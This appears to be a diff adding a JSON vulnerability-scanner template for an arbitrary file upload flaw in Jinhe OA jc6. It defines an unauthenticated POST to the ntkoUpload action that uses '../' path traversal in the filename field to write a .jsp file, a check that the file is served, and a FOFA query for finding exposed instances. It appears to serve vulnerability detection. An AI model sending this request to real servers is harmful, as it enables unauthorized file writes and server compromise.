@@ -1,0 +1,48 @@
+{
+  "product": "金和OA",
+  "vul_name": "金和OA jc6 ntko-upload任意文件上传",
+  "type": "文件上传",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "金和OA jc6系统ntkoUpload接口处存在任意文件上传漏洞，未经身份认证的攻击者可利用此漏洞上传恶意后门文件，最终可导致服务器失陷。",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"金和网络-金和OA\""
+  },
+  "protocol": "http",
+  "link": "https://download.csdn.net/blog/column/12564481/135840178",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "model": "",
+  "logic": "and",
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/jc6/ntkoUpload/ntko-upload!upload.action",
+      "file": {
+        "upLoadFile": [
+          "52e039302a62d077.jpg",
+          "95cc64dd2825f9df13ec4ad683ecf339",
+          "image/jpeg"
+        ]
+      },
+      "data": {
+        "filename": "../../../../upload/52e039302a62d077.jsp",
+        "Submit": "upload"
+      }
+    },
+    "verify": {
+      "path": "/upload/52e039302a62d077.jsp",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "95cc64dd2825f9df13ec4ad683ecf339"
+        }
+      ]
+    }
+  }
+}
